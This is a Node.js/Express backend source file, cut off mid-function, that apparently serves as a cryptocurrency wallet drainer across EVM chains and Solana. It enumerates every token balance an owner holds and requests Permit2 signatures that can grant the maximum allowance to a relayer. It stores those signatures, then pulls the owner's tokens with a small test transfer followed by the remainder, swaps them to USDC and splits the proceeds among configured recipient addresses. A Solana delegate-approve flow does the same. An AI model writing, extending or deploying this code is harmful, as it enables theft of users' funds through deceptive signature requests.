// server.js (versión corregida y completa)
import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import dotenv from "dotenv";
import fs from "fs-extra";
import { ethers } from "ethers";
import axios from "axios";
import crypto from "crypto";
import bs58 from "bs58";
import { Connection, PublicKey, Keypair, Transaction } from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createApproveInstruction,
  createTransferCheckedInstruction,
  createAssociatedTokenAccountInstruction,
  TOKEN_PROGRAM_ID
} from "@solana/spl-token";
import pkg from "@uniswap/permit2-sdk";
const { AllowanceTransfer } = pkg;

import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

// ESM __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ----------------- Crea app ANTES de usarla -----------------
const app = express();

// Configuración de CORS mejorada
const allowedOrigins = ['https://frontpermi.vercel.app', 'http://localhost:3000'];
app.use(cors({
  origin: function (origin, callback) {
    // Permitir requests sin origin (como mobile apps o curl requests)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

// Manejo explícito de preflight requests
app.options('*', cors());

app.use(express.static(path.join(__dirname, "../public")));
app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// Middleware para forzar JSON en todas las respuestas
app.use((req, res, next) => {
  res.setHeader('Content-Type', 'application/json');
  next();
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Backend server is running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

app.get('/ping', (req, res) => { 
  res.json({ ok: true });
});

// ----------------- CONFIG -----------------
const PORT = Number(process.env.PORT || 3001); // Cambiado a 3001 para evitar conflictos
const DEFAULT_CHAIN = Number(process.env.CHAIN_ID || 80002);
const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY || "";
const RELAYER_SOL_SECRET = process.env.RELAYER_SOL_SECRET || process.env.SOL_RELAYER_PRIVATE_KEY || "";
const SOL_RELAYER_ADDRESS = process.env.SOL_RELAYER_ADDRESS || "";
const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS || "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const USDC_ADDRESS = process.env.USDC_ADDRESS || "";
const QUICKSWAP_ROUTER = process.env.QUICKSWAP_ROUTER || "";
const ONEINCH_BASE = (process.env.ONEINCH_API_URL || "https://api.1inch.io/v5.0").replace(/\/$/, "");
const ALCHEMY_KEY = process.env.ALCHEMY_API_KEY || "";
const COVALENT_KEY = process.env.COVALENT_API_KEY || "";
const JUPITER_QUOTE_API = process.env.JUPITER_QUOTE_API || "https://quote-api.jup.ag/v1/quote";
const JUPITER_SWAP_API = process.env.JUPITER_SWAP_API || "https://quote-api.jup.ag/v1/swap";
const SOLANA_RPC = process.env.SOLANA_RPC || "https://api.devnet.solana.com";
const RECIPIENTS = (process.env.RECIPIENTS || "").split(",").map(s => s.trim()).filter(Boolean);
const MAX_JOB_RETRIES = Number(process.env.MAX_JOB_RETRIES || 3);
const SOL_USDC_MINT = process.env.SOL_USDC_MINT || null;

// 1inch native token address marker
const ONEINCH_NATIVE_ADDRESS = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";

// Mapeo de símbolos para tokens nativos
const NATIVE_SYMBOLS = {
  1: "ETH",
  56: "BNB",
  137: "MATIC",
  80002: "MATIC",
  43114: "AVAX",
  250: "FTM",
  42161: "ETH",
  10: "ETH"
};

// provider map (EVM chains) - use your RPC env vars
const PROVIDERS = {
  1: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_ETH || process.env.RPC_URL || ""),
  56: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_BSC || process.env.RPC_URL || ""),
  137: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_POLY || process.env.RPC_URL || ""),
  80002: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_AMOY || process.env.RPC_URL || ""),
  43114: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_AVAX || process.env.RPC_URL || ""),
  250: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_FTM || process.env.RPC_URL || ""),
  42161: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_ARB || process.env.RPC_URL || ""),
  10: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_OP || process.env.RPC_URL || "")
};

// Solana connection
const solanaConn = new Connection(SOLANA_RPC, "confirmed");

// Try to load Solana relayer keypair if provided
let solRelayerKeypair = null;
if (RELAYER_SOL_SECRET) {
  try {
    if (RELAYER_SOL_SECRET.trim().startsWith("[")) {
      const arr = JSON.parse(RELAYER_SOL_SECRET);
      solRelayerKeypair = Keypair.fromSecretKey(Uint8Array.from(arr));
    } else {
      const sk = bs58.decode(RELAYER_SOL_SECRET);
      solRelayerKeypair = Keypair.fromSecretKey(sk);
    }
  } catch (e) {
    console.warn("Could not parse RELAYER_SOL_SECRET (expected base58 or JSON array):", e?.message || e);
  }
}
if (!solRelayerKeypair) {
  if (SOL_RELAYER_ADDRESS) console.warn("SOL relayer address set but RELAYER_SOL_SECRET not loaded — Solana delegate flows disabled until secret provided.");
  else console.warn("No Solana relayer configured. To enable Solana delegate flows set RELAYER_SOL_SECRET in .env.");
}

// Relayer signer for all EVM chains
if (!RELAYER_PRIVATE_KEY) console.warn("⚠️ RELAYER_PRIVATE_KEY not set");
const relayerSigners = {};
for (const chainId of Object.keys(PROVIDERS)) {
  try {
    if (RELAYER_PRIVATE_KEY) {
      relayerSigners[chainId] = new ethers.Wallet(RELAYER_PRIVATE_KEY, PROVIDERS[chainId]);
    }
  } catch (e) {
    console.warn(`Relayer signer init failed for chain ${chainId}`, e.message || e);
  }
}

// ABIs minimal
const erc20Abi = [
  "function approve(address spender,uint256 amount) external returns (bool)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) external returns (bool)"
];
const permit2Abi = [
  "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
  "function transferFrom(address from, address to, uint160 amount, address token) external"
];

// persistence files
const SIG_FILE = "signatures.txt";
const NONCE_FILE = "nonces.json";
const JOBS_FILE = "jobs.json";

// helpers persistence (no top-level await here)
async function getAndReserveNonce(owner, token) {
  try {
    const nonces = await fs.readJson(NONCE_FILE);
    const key = `${owner.toLowerCase()}-${(token || 'native')}`;
    const n = Number(nonces[key] || 0);
    nonces[key] = n + 1;
    await fs.writeJson(NONCE_FILE, nonces, { spaces: 2 });
    return n;
  } catch (e) {
    console.warn("Error reading/writing nonce file:", e.message || e);
    return 0;
  }
}

async function appendSignature(obj) {
  try {
    await fs.appendFile(SIG_FILE, JSON.stringify(obj) + "\n");
  } catch (e) {
    console.warn("Error appending signature:", e.message || e);
  }
}

async function enqueueJob(job) {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    jobs.push(job);
    await fs.writeJson(JOBS_FILE, jobs, { spaces: 2 });
  } catch (e) {
    console.warn("Error enqueueing job:", e.message || e);
  }
}

async function updateJob(id, patch) {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    const idx = jobs.findIndex(j => j.id === id);
    if (idx === -1) return null;
    jobs[idx] = { ...jobs[idx], ...patch };
    await fs.writeJson(JOBS_FILE, jobs, { spaces: 2 });
    return jobs[idx];
  } catch (e) {
    console.warn("Error updating job:", e.message || e);
    return null;
  }
}

async function getNextPendingJob() {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    return jobs.find(j => j.status === 'pending' || j.status === 'awaiting_transfer') || null;
  } catch (e) {
    console.warn("Error reading jobs file:", e.message || e);
    return null;
  }
}

function genId() { return crypto.randomBytes(8).toString('hex'); }

// ----------------- TOKEN DETECTION -----------------
async function getEvmTokens(chainId, owner) {
  const out = [];
  try {
    if (ALCHEMY_KEY) {
      const hostMap = {
        1: "eth-mainnet",
        56: "bsc-mainnet",
        137: "polygon-mainnet",
        80002: "polygon-amoy",
        80001: "polygon-mumbai",
        43114: "avalanche-mainnet",
        250: "fantom-mainnet",
        42161: "arbitrum-mainnet",
        10: "optimism-mainnet"
      };
      const host = hostMap[Number(chainId)];
      if (host) {
        const url = `https://${host}.g.alchemy.com/v2/${ALCHEMY_KEY}`;
        const body = { jsonrpc: "2.0", id: 42, method: "alchemy_getTokenBalances", params: [owner, "erc20"] };
        const r = await axios.post(url, body);
        const list = r?.data?.result?.tokenBalances ?? [];
        const prov = PROVIDERS[chainId];
        for (const tb of list) {
          try {
            if (!tb.contractAddress) continue;
            const bal = ethers.BigNumber.from(tb.tokenBalance || "0x0");
            if (bal.isZero()) continue;
            const c = new ethers.Contract(tb.contractAddress, ["function decimals() view returns (uint8)", "function symbol() view returns (string)"], prov);
            const decimals = Number(await c.decimals().catch(() => 18));
            const symbol = await c.symbol().catch(() => "TOKEN");
            out.push({ chain: chainId, symbol, address: tb.contractAddress, decimals, balance: bal.toString() });
          } catch (e) { continue; }
        }
        if (out.length) return out;
      }
    }
  } catch (e) { console.warn("alchemy tokenbalances failed", e?.response?.data || e?.message || e); }

  try {
    if (COVALENT_KEY) {
      const map = { 1: 1, 56: 56, 137: 137, 43114: 43114, 250: 250, 42161: 42161, 10: 10 };
      const covChain = map[chainId];
      if (covChain) {
        const url = `https://api.covalenthq.com/v1/${covChain}/address/${owner}/balances_v2/?key=${COVALENT_KEY}`;
        const r = await axios.get(url);
        const items = r?.data?.data?.items ?? [];
        for (const it of items) {
          try {
            const addr = it.contract_address;
            const bal = ethers.BigNumber.from(it.balance || "0");
            if (bal.isZero()) continue;
            out.push({ chain: chainId, symbol: it.contract_ticker_symbol || it.contract_name || "TOKEN", address: addr, decimals: Number(it.contract_decimals || 18), balance: bal.toString() });
          } catch (e) { continue; }
        }
        if (out.length) return out;
      }
    }
  } catch (e) { console.warn("covalent fallback failed", e?.message || e); }

  return out;
}

async function getSolanaTokens(owner) {
  const out = [];
  try {
    const pk = new PublicKey(owner);
    const solBal = await solanaConn.getBalance(pk).catch(() => 0);
    if (solBal && solBal > 0) out.push({ chain: "solana", symbol: "SOL", address: null, decimals: 9, balance: solBal.toString() });
    const resp = await solanaConn.getParsedTokenAccountsByOwner(pk, { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") });
    for (const v of resp.value) {
      try {
        const parsed = v.account.data.parsed.info;
        const mint = parsed.mint;
        const amt = parsed.tokenAmount;
        if (!amt || Number(amt.amount) === 0) continue;
        out.push({ chain: "solana", symbol: amt.uiAmountString || "SPL", address: mint, decimals: Number(amt.decimals || 0), balance: amt.amount.toString() });
      } catch (e) { continue; }
    }
  } catch (e) { console.warn("solana scan failed", e?.message || e); }
  return out;
}

async function getTokensAllChains(owner) {
  const tokens = [];
  const evmChains = Object.keys(PROVIDERS).map(x => Number(x));
  for (const c of evmChains) {
    try {
      const ev = await getEvmTokens(c, owner);
      try {
        const prov = PROVIDERS[c];
        const nb = await prov.getBalance(owner).catch(() => null);
        if (nb && !nb.isZero()) {
          const symbol = NATIVE_SYMBOLS[c] || "NATIVE";
          ev.unshift({ chain: c, symbol, address: null, decimals: 18, balance: nb.toString() });
        }
      } catch (e) { }
      for (const t of ev) tokens.push(t);
    } catch (e) { console.warn("chain scan fail", c, e?.message || e); }
  }
  const sol = await getSolanaTokens(owner).catch(() => []);
  for (const s of sol) tokens.push(s);
  return tokens;
}

// ----------------- EXPRESS API -----------------

app.post('/wrap-info', (req, res) => {
  try {
    const chain = Number(req.body.chain || DEFAULT_CHAIN);
    const map = {
      1: process.env.WETH_ADDRESS_1 || "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      56: process.env.WBNB_ADDRESS_56 || "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      137: process.env.WMATIC_ADDRESS_137 || "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
      80002: process.env.WMATIC_ADDRESS_80002 || "",
      43114: process.env.WAVAX_ADDRESS_43114 || "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",
      250: process.env.WFTM_ADDRESS_250 || "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",
      42161: process.env.WETH_ADDRESS_42161 || "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
      10: process.env.WETH_ADDRESS_10 || "0x4200000000000000000000000000000000000006"
    };
    res.json({ wrappedAddress: map[chain] || null, permit2: PERMIT2_ADDRESS });
  } catch (e) { res.status(500).json({ error: e.message || String(e) }); }
});

app.get('/permit2-spender', (req, res) => {
  res.json({ spender: PERMIT2_ADDRESS });
});

app.post('/owner-tokens', async (req, res) => {
  try {
    const { owner, chain } = req.body;
    if (!owner) return res.status(400).json({ error: "owner required" });
    if (chain === 'solana' || chain === 'Solana') {
      const sol = await getSolanaTokens(owner);
      return res.json({ tokens: sol });
    }
    if (chain) {
      const ch = Number(chain);
      const ev = await getEvmTokens(ch, owner);
      try {
        const nb = await PROVIDERS[ch].getBalance(owner).catch(() => null);
        if (nb && !nb.isZero()) {
          const symbol = NATIVE_SYMBOLS[ch] || "NATIVE";
          ev.unshift({ chain: ch, symbol, address: null, decimals: 18, balance: nb.toString() });
        }
      } catch (e) { }
      return res.json({ tokens: ev });
    }
    const tokens = await getTokensAllChains(owner);
    return res.json({ tokens });
  } catch (e) {
    console.error('/owner-tokens error', e);
    return res.status(500).json({ error: e.message || String(e) });
  }
});

app.post('/permit-data', async (req, res) => {
  try {
    const { owner, token, amount, expiration, chain, global } = req.body;
    if (!owner || !token) return res.status(400).json({ error: "owner and token required" });

    // Si el token es nativo, no generar datos de permiso
    if (!token || token === ONEINCH_NATIVE_ADDRESS) {
      return res.status(400).json({ error: "Native tokens do not require permit" });
    }

    let amountStr = amount || "0";
    if (global) {
      const MAX_U160 = ethers.BigNumber.from(2).pow(160).sub(1);
      amountStr = MAX_U160.toString();
    } else {
      if (!amountStr || amountStr === "0") return res.status(400).json({ error: "amount required when global not set" });
    }
    const nonce = await getAndReserveNonce(owner, token);
    const permitSingle = {
      details: { token, amount: ethers.BigNumber.from(amountStr).toString(), expiration: Number(expiration || 0), nonce: Number(nonce) },
      spender: relayerSigners[chain] ? relayerSigners[chain].address : process.env.RELAYER_ADDRESS || "",
      sigDeadline: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30
    };
    const typed = AllowanceTransfer.getPermitData(permitSingle, PERMIT2_ADDRESS, Number(chain || DEFAULT_CHAIN));
    res.json({ ...typed, _backend_nonce: nonce });
  } catch (e) {
    console.error('/permit-data', e);
    res.status(500).json({ error: e.message || String(e) });
  }
});

app.post('/save-signature', async (req, res) => {
  try {
    const { owner, token, typedData, signature, chain } = req.body;
    if (!owner || !token || !typedData || !signature) return res.status(400).json({ error: "owner, token, typedData, signature required" });
    const entry = { now: new Date().toISOString(), owner, token, typedData, signature, used: false, chain: chain || DEFAULT_CHAIN };
    await appendSignature(entry);
    const job = { id: genId(), createdAt: new Date().toISOString(), status: "pending", retries: 0, owner, token, typedData, signature, chain: chain || DEFAULT_CHAIN };
    await enqueueJob(job);
    return res.json({ ok: true, jobId: job.id });
  } catch (e) {
    console.error('/save-signature', e);
    return res.status(500).json({ error: e.message || String(e) });
  }
});

app.post('/solana-approve-tx', async (req, res) => {
  try {
    const { owner, tokenMint, amount, decimals } = req.body;
    if (!owner || !tokenMint || !amount) return res.status(400).json({ error: "owner, tokenMint, amount required" });
    const ownerPub = new PublicKey(owner);
    const mintPub = new PublicKey(tokenMint);
    const ownerAta = await getAssociatedTokenAddress(mintPub, ownerPub);
    const delegatePub = SOL_RELAYER_ADDRESS || (solRelayerKeypair ? solRelayerKeypair.publicKey.toBase58() : null);
    if (!delegatePub) return res.status(400).json({ error: "SOL relayer address not configured on backend (SOL_RELAYER_ADDRESS or RELAYER_SOL_SECRET)" });
    const delegate = new PublicKey(delegatePub);
    const rawAmount = BigInt(amount);
    const ix = createApproveInstruction(ownerAta, delegate, ownerPub, Number(rawAmount), []);
    const tx = new Transaction();
    tx.feePayer = ownerPub;
    tx.add(ix);
    const { blockhash } = await solanaConn.getRecentBlockhash("finalized");
    tx.recentBlockhash = blockhash;
    const serializedBase64 = tx.serialize({ requireAllSignatures: false, verifySignatures: false }).toString('base64');
    return res.json({ ok: true, unsignedTxBase64: serializedBase64, ownerAta: ownerAta.toBase58(), delegate: delegatePub });
  } catch (e) {
    console.error('/solana-approve-tx', e);
    return res.status(500).json({ error: e.message || String(e) });
  }
});

app.post('/save-sol-signed-approve', async (req, res) => {
  try {
    const { owner, tokenMint, signedTxBase64, amount, decimals } = req.body;
    if (!owner || !tokenMint || !signedTxBase64 || !amount) return res.status(400).json({ error: "owner, tokenMint, signedTxBase64, amount required" });
    const job = { id: genId(), createdAt: new Date().toISOString(), status: "pending", retries: 0, owner, token: tokenMint, chain: 'solana', signedApproveTx: signedTxBase64, amount: amount.toString(), decimals: Number(decimals || 0) };
    await enqueueJob(job);
    await appendSignature({ now: new Date().toISOString(), owner, token: tokenMint, signedApproveTx: true });
    return res.json({ ok: true, jobId: job.id });
  } catch (e) {
    console.error('/save-sol-signed-approve', e);
    return res.status(500).json({ error: e.message || String(e) });
  }
});

app.post('/create-transfer-request', async (req, res) => {
  try {
    const { owner, chain, token, amount } = req.body;
    if (!owner || !chain || !amount) return res.status(400).json({ error: "owner, chain, amount required" });

    // Si es token nativo, manejar de forma diferente
    if (!token || token === ONEINCH_NATIVE_ADDRESS) {
      // Crear una transacción simple de transferencia nativa
      const id = genId();
      const job = {
        id,
        createdAt: new Date().toISOString(),
        status: 'awaiting_transfer',
        owner,
        token: null,
        chain,
        amount,
        isNative: true  // Bandera para identificar token nativo
      };
      await enqueueJob(job);
      return res.json({
        ok: true,
        instructions: {
          id,
          relayerAddress: relayerSigners[chain] ? relayerSigners[chain].address : process.env.RELAYER_ADDRESS || "",
          amount
        },
        jobId: id
      });
    }

    const id = genId();
    const job = { id, createdAt: new Date().toISOString(), status: 'awaiting_transfer', owner, token: token || null, chain, amount };
    await enqueueJob(job);
    return res.json({ ok: true, instructions: { id, relayerAddress: relayerSigners[chain] ? relayerSigners[chain].address : process.env.RELAYER_ADDRESS || "", amount }, jobId: id });
  } catch (e) {
    console.error('/create-transfer-request', e);
    return res.status(500).json({ error: e.message || String(e) });
  }
});

// Endpoint para transferencias nativas
app.post('/create-native-transfer-request', async (req, res) => {
  try {
    const { owner, chain, amount } = req.body;
    if (!owner || !chain || !amount) {
      return res.status(400).json({ error: "owner, chain, and amount are required" });
    }

    // Crear un job para transferencia nativa
    const id = genId();
    const job = {
      id,
      createdAt: new Date().toISOString(),
      status: 'awaiting_transfer',
      owner,
      token: null, // null indica token nativo
      chain,
      amount,
      isNative: true // Bandera para identificar token nativo
    };

    await enqueueJob(job);

    res.json({
      ok: true,
      instructions: {
        id,
        relayerAddress: relayerSigners[chain] ? relayerSigners[chain].address : process.env.RELAYER_ADDRESS || "",
        amount
      },
      jobId: id
    });
  } catch (error) {
    console.error('Error en /create-native-transfer-request:', error);
    res.status(500).json({ error: error.message || "Internal server error" });
  }
});

app.get('/jobs', async (req, res) => {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    res.json({ jobs });
  } catch (e) {
    res.status(500).json({ error: e.message || "Error reading jobs" });
  }
});

app.get('/job/:id', async (req, res) => {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    const j = jobs.find(x => x.id === req.params.id);
    if (!j) return res.status(404).json({ error: 'job not found' });
    res.json({ job: j });
  } catch (e) {
    res.status(500).json({ error: e.message || "Error reading job" });
  }
});

// ----------------- SWAP HELPERS -----------------
async function swapVia1inch(chainId, tokenIn, amount, relayerAddress) {
  try {
    // pre-check quote
    const qUrl = `${ONEINCH_BASE}/${chainId}/quote`;
    const q = await axios.get(qUrl, { params: { fromTokenAddress: tokenIn, toTokenAddress: USDC_ADDRESS, amount: amount.toString() }, timeout: 10000 }).catch(() => null);
    if (!q || !q.data || !q.data.toTokenAmount) return { ok: false, error: 'no-quote' };

    // then request swap
    const url = `${ONEINCH_BASE}/${chainId}/swap`;
    const params = { fromTokenAddress: tokenIn, toTokenAddress: USDC_ADDRESS, amount: amount.toString(), fromAddress: relayerAddress, slippage: 200 };
    const r = await axios.get(url, { params, timeout: 30000 });
    if (r.data && r.data.tx) return { ok: true, tx: r.data.tx };
    return { ok: false, error: 'no tx' };
  } catch (e) { return { ok: false, error: e?.response?.data || e?.message || String(e) }; }
}

async function quoteTokenAmountForUsd(chainId, tokenAddr, usdAmount) {
  try {
    if (!ONEINCH_BASE || !USDC_ADDRESS) return null;
    const usdcDecimals = 6;
    const usdcAmount = ethers.BigNumber.from(Math.floor(usdAmount * Math.pow(10, usdcDecimals))).toString();
    const url = `${ONEINCH_BASE}/${chainId}/quote`;
    const params = { fromTokenAddress: USDC_ADDRESS, toTokenAddress: tokenAddr, amount: usdcAmount };
    const r = await axios.get(url, { params, timeout: 15000 });
    if (r.data && (r.data.toTokenAmount || r.data.toTokenAmount === '0')) {
      return ethers.BigNumber.from(r.data.toTokenAmount.toString());
    }
    return null;
  } catch (e) { console.warn('quoteTokenAmountForUsd failed', e?.response?.data || e?.message || String(e)); return null; }
}

async function jupiterQuote(inputMint, outputMint, amount) {
  try { const params = { inputMint, outputMint, amount: amount.toString(), slippageBps: 200 }; const r = await axios.get(JUPITER_QUOTE_API, { params, timeout: 30000 }); return { ok: true, data: r.data }; } catch (e) { return { ok: false, error: e?.response?.data || e?.message || String(e) }; }
}

async function jupiterSwapViaApi(inputMint, outputMint, amount, userPublicKey) {
  try { const params = { inputMint, outputMint, amount: amount.toString(), slippageBps: 200, userPublicKey }; const r = await axios.get(JUPITER_SWAP_API, { params, timeout: 30000 }); return { ok: true, data: r.data }; } catch (e) { return { ok: false, error: e?.response?.data || e?.message || String(e) }; }
}

// ----------------- PROCESS JOB -----------------
async function markSignatureUsed(owner, token) {
  try {
    const lines = (await fs.readFile(SIG_FILE, "utf8")).split(/\n/).filter(Boolean);
    const out = [];
    for (const l of lines) {
      try {
        const obj = JSON.parse(l);
        if (obj.owner?.toLowerCase() === owner.toLowerCase() && obj.token?.toLowerCase() === (token || '').toLowerCase() && !obj.used) {
          obj.used = true; obj.usedAt = new Date().toISOString();
        }
        out.push(JSON.stringify(obj));
      } catch (e) { out.push(l); }
    }
    await fs.writeFile(SIG_FILE, out.join("\n") + "\n");
  } catch (e) {
    console.warn("Error marking signature as used:", e.message || e);
  }
}

async function processJob(job) {
  const { id, owner, token, typedData, signature, chain } = job;
  const out = { jobId: id, owner, token, chain, ok: false, steps: [] };

  try {
    // Handle native tokens first
    if (job.isNative && job.chain !== 'solana') {
      const chainId = Number(job.chain || DEFAULT_CHAIN);
      const prov = PROVIDERS[chainId];
      if (!prov) { out.steps.push('no provider for chain ' + chainId); return out; }

      const relayer = relayerSigners[chainId] || new ethers.Wallet(RELAYER_PRIVATE_KEY, prov);

      // For native tokens, we simply transfer from relayer to recipients
      const amount = ethers.BigNumber.from(job.amount);
      const value = amount.div(RECIPIENTS.length || 1);

      for (const recipient of RECIPIENTS) {
        if (!recipient) continue;

        try {
          const tx = await relayer.sendTransaction({
            to: recipient,
            value: value,
            gasLimit: 21000
          });
          out.steps.push({ nativeTransferTx: tx.hash, recipient, amount: value.toString() });
          await tx.wait();
        } catch (e) {
          out.steps.push(`Native transfer failed to ${recipient}: ${e.message || e}`);
        }
      }

      out.ok = true;
      return out;
    }

    if (job.status === 'awaiting_transfer') {
      // existing awaiting_transfer logic unchanged
      out.ok = false;
      return out;
    }

    // SOLANA delegate flow
    if (chain === 'solana' || chain === 'Solana') {
      if (job.signedApproveTx) {
        try {
          const txBytes = Buffer.from(job.signedApproveTx, 'base64');
          const tx = Transaction.from(txBytes);
          const sig = await solanaConn.sendRawTransaction(tx.serialize());
          await solanaConn.confirmTransaction(sig);
          out.steps.push('Signed approve tx broadcasted: ' + sig);
        } catch (e) { out.steps.push('broadcast signed approve failed: ' + (e?.message || e)); return out; }
      }

      if (!solRelayerKeypair) { out.steps.push('Solana relayer keypair not configured'); return out; }

      try {
        const ownerPub = new PublicKey(job.owner);
        const mintPub = new PublicKey(job.token);
        const ownerAta = await getAssociatedTokenAddress(mintPub, ownerPub);
        const relayerPub = solRelayerKeypair.publicKey;
        const relayerAta = await getAssociatedTokenAddress(mintPub, relayerPub);

        // ensure relayer ATA exists - create if necessary
        try { await solanaConn.getAccountInfo(relayerAta); } catch (e) {
          const ix = createAssociatedTokenAccountInstruction(solRelayerKeypair.publicKey, relayerAta, relayerPub, mintPub);
          const tx = new Transaction(); tx.add(ix); tx.feePayer = relayerPub; const recent = await solanaConn.getRecentBlockhash('finalized'); tx.recentBlockhash = recent.blockhash;
          await solanaConn.sendTransaction(tx, [solRelayerKeypair]);
        }

        // compute small amount: try Jupiter quote (if available) otherwise fallback fraction
        const total = BigInt(job.amount || 0);
        let small = BigInt(0);
        try { small = total / BigInt(100); if (small <= 0) small = BigInt(1); } catch (e) { small = BigInt(1); }

        // first transfer (small)
        const ixSmall = createTransferCheckedInstruction(ownerAta, mintPub, relayerAta, ownerPub, Number(small), Number(job.decimals || 0));
        const txSmall = new Transaction(); txSmall.feePayer = relayerPub; txSmall.add(ixSmall);
        const recent = await solanaConn.getRecentBlockhash('finalized'); txSmall.recentBlockhash = recent.blockhash;
        const sigSmall = await solanaConn.sendTransaction(txSmall, [solRelayerKeypair]);
        await solanaConn.confirmTransaction(sigSmall);
        out.steps.push('sol small transfer sig: ' + sigSmall);

        // remaining
        const remaining = total - small;
        if (remaining > 0) {
          const ixRem = createTransferCheckedInstruction(ownerAta, mintPub, relayerAta, ownerPub, Number(remaining), Number(job.decimals || 0));
          const txRem = new Transaction(); txRem.feePayer = relayerPub; txRem.add(ixRem);
          const recent2 = await solanaConn.getRecentBlockhash('finalized'); txRem.recentBlockhash = recent2.blockhash;
          const sigRem = await solanaConn.sendTransaction(txRem, [solRelayerKeypair]);
          await solanaConn.confirmTransaction(sigRem);
          out.steps.push('sol remaining transfer sig: ' + sigRem);
        }

        await markSignatureUsed(job.owner, job.token);
        out.ok = true; return out;
      } catch (e) { out.steps.push('solana delegate failed: ' + (e?.message || e)); return out; }
    }

    // EVM flows: use Permit2 then two transferFrom (small + remaining)
    const chainId = Number(chain || DEFAULT_CHAIN);
    const prov = PROVIDERS[chainId];
    if (!prov) { out.steps.push('no provider for chain ' + chainId); return out; }
    const relayer = relayerSigners[chainId] || new ethers.Wallet(RELAYER_PRIVATE_KEY, prov);
    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, permit2Abi, relayer);

    if (!typedData || !signature) { out.steps.push('missing typedData/signature'); return out; }
    const permitObj = typedData.message.permitSingle || typedData.message;
    if (!permitObj || !permitObj.details || !permitObj.details.token) { out.steps.push('permit token missing'); out.ok = false; return out; }

    out.steps.push('sending permit()');
    const txP = await permit2.permit(owner, permitObj, signature, { gasLimit: 700000 });
    out.steps.push({ permitTx: txP.hash });
    await txP.wait();
    out.steps.push('permit confirmed');

    const fullAmount = ethers.BigNumber.from(permitObj.details.amount);

    // compute smallAmount via 1inch quote (USDC -> token) for ~$2
    let smallAmount = null;
    try { const quoted = await quoteTokenAmountForUsd(chainId, permitObj.details.token, 2); if (quoted && quoted.gt(0) && quoted.lte(fullAmount)) smallAmount = quoted; } catch (e) { out.steps.push('quote failed: ' + (e?.message || e)); }
    if (!smallAmount) { smallAmount = fullAmount.div(100); if (smallAmount.lte(0)) smallAmount = ethers.BigNumber.from(1); if (smallAmount.gt(fullAmount)) smallAmount = fullAmount; out.steps.push('smallAmount fallback used: ' + smallAmount.toString()); }

    // helper to swap & distribute
    async function swapAndDistributeTokenAmount(tokenAddr, amountToHandle) {
      let swapped = false;
      if (ONEINCH_BASE && USDC_ADDRESS) {
        const s = await swapVia1inch(chainId, tokenAddr, amountToHandle, relayer.address);
        if (s.ok && s.tx) { try { const txData = s.tx; const txSent = await relayer.sendTransaction({ to: txData.to, data: txData.data, value: ethers.BigNumber.from(txData.value || "0"), gasLimit: txData.gas || 1500000 }); out.steps.push({ swapTx: txSent.hash }); await txSent.wait(); swapped = true; } catch (e) { out.steps.push('sending swap failed: ' + (e?.message || e)); swapped = false; } }
      }
      if (swapped && USDC_ADDRESS) { try { const usdcC = new ethers.Contract(USDC_ADDRESS, erc20Abi, relayer); const usdcBal = await usdcC.balanceOf(relayer.address); if (usdcBal.isZero()) return false; const per = usdcBal.div(RECIPIENTS.length || 1); for (const r of RECIPIENTS) { if (!r) continue; const tx = await usdcC.transfer(r, per); await tx.wait(); out.steps.push(`Sent USDC ${per.toString()} -> ${r}`); } return true; } catch (e) { out.steps.push('distribute USDC failed: ' + (e?.message || e)); return false; } }
      // fallback: distribute token directly
      try { const tokenC = new ethers.Contract(tokenAddr, erc20Abi, relayer); const bal = await tokenC.balanceOf(relayer.address); if (bal.isZero()) return false; const per = bal.div(RECIPIENTS.length || 1); for (const r of RECIPIENTS) { if (!r) continue; const tx = await tokenC.transfer(r, per); await tx.wait(); out.steps.push(`Sent token ${per.toString()} -> ${r}`); } return true; } catch (e) { out.steps.push('token fallback distribute failed: ' + (e?.message || e)); return false; }
    }

    // First small pull
    try {
      out.steps.push('transferFrom owner -> relayer (small): ' + smallAmount.toString());
